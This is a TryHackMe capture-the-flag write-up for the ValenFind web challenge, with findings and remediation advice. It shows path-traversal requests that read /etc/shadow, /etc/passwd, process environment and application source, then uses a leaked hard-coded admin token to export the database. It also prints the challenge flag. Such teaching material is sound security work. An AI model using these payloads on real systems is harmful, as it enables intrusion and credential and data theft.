# TryHackMe — ValenFind CTF Write-up

> **Type:** Web exploitation / CTF  
> **Target:** `http://10.113.167.102:5000` (temporary TryHackMe lab address; it may change)  
> **Status:** Solved  
> **Scope:** Authorized training lab only

## Executive summary

The challenge was solved by chaining an arbitrary file-read vulnerability in the `/api/fetch_layout` endpoint with sensitive information exposed in the application's source code. The source revealed a hard-coded administrative token and an endpoint that exports the SQLite database. The token was accepted, the database was downloaded, and the challenge flag was recovered during local analysis.

## Walkthrough

### 1. Identify file-read behavior

Start by requesting a normal layout to understand the endpoint's expected behavior:

```http
GET /api/fetch_layout?layout=theme_modern.html
```

Then test path traversal in the authorized lab:

```http
GET /api/fetch_layout?layout=../../../../../etc/passwd
GET /api/fetch_layout?layout=../../../../../etc/hostname
GET /api/fetch_layout?layout=../../../../../etc/shadow
```

The responses included recognizable system-file content. This supported the finding of **Path Traversal / Arbitrary File Read**. An invalid relative path also exposed the application's template directory:

```text
/opt/Valenfind/templates/components/
```

### 2. Inspect the systemd service

Read the service file to understand how the application is launched:

```http
GET /api/fetch_layout?layout=../../../../../etc/systemd/system/valenfind.service
```

Relevant configuration observed:

```ini
[Service]
User=root
Group=root
WorkingDirectory=/opt/Valenfind
Environment=PYTHONUNBUFFERED=1
ExecStart=/usr/bin/python3 /opt/Valenfind/app.py
Restart=always
```

**Finding:** The service is configured to run as `root`, violating the principle of least privilege. This increases potential impact but does not, by itself, mean that a shell was obtained.

### 3. Check process environment (supporting observation)

```http
GET /api/fetch_layout?layout=../../../../../proc/self/environ
```

The observed response included `LANG=C.UTF-8`. This result alone did not establish whether additional environment variables were present, so it was treated only as supporting information.

### 4. Review application source

Read the application source through the same vulnerable endpoint:

```http
GET /api/fetch_layout?layout=../../../../../opt/Valenfind/app.py
```

The source showed these important definitions:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

It also showed that `/api/admin/export_db` reads the `X-Valentine-Token` request header and compares it with the hard-coded key. If the check succeeds, the endpoint sends the database file as `valenfind_leak.db`.

### 5. Verify the database-export endpoint

In the authorized lab, send a request to the export endpoint with the token discovered in the source:

```http
GET /api/admin/export_db
X-Valentine-Token: [token found in the lab source]
```

The response was `HTTP 200 OK`, included a download filename of `valenfind_leak.db`, and began with the SQLite signature `SQLite format 3`. These observations confirmed that the endpoint accepted the token and returned a SQLite database.

### 6. Inspect the downloaded database locally

Open the downloaded database using DB Browser for SQLite or another local SQLite viewer:

1. Open **Database Structure**.
2. Review table and column names relevant to the challenge.
3. Search for challenge-related evidence locally.
4. Avoid publishing user records, passwords, session cookies, or other unnecessary sensitive data.

The flag was recovered during the local database-analysis stage.

## Flag

```text
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

## Findings and root causes

| Finding | Impact |
|---|---|
| Path traversal / arbitrary file read | Allowed access to files outside the intended template directory. |
| Hard-coded administrative token | The token could be discovered through source-file disclosure and reused. |
| Database-export endpoint protected by the exposed token | A leaked token enabled downloading the database. |
| Application service runs as `root` | Increased potential impact if the application is compromised. |
| Passwords compared directly against database values in the reviewed code | Indicates passwords may be stored in plaintext rather than using a password-hashing scheme. |

## Remediation

- Replace user-controlled file paths with a strict allowlist of permitted template names.
- Canonicalize and validate paths, ensuring they remain inside the approved template directory.
- Run the web application under a dedicated, unprivileged service account.
- Remove hard-coded secrets from source code, rotate exposed credentials, and use a secret manager or protected environment configuration.
- Enforce robust authorization on database export, log administrative exports, and avoid exposing the entire database unless necessary.
- Store passwords using a purpose-built password-hashing algorithm such as Argon2id, bcrypt, or scrypt with appropriate salts.
- Add regression tests for path traversal, authorization failures, secret exposure, and database-export behavior.

## Lessons learned

This challenge demonstrated the value of following evidence step by step: verify file-read behavior, establish the application path, inspect service configuration, review source code, and validate the impact of exposed credentials. Each conclusion should be tied to an observed response, and testing should remain within explicitly authorized environments.

---

*Prepared as an educational CTF write-up. The target IP is specific to the lab session and may no longer be valid. Do not run these tests against systems without permission.*
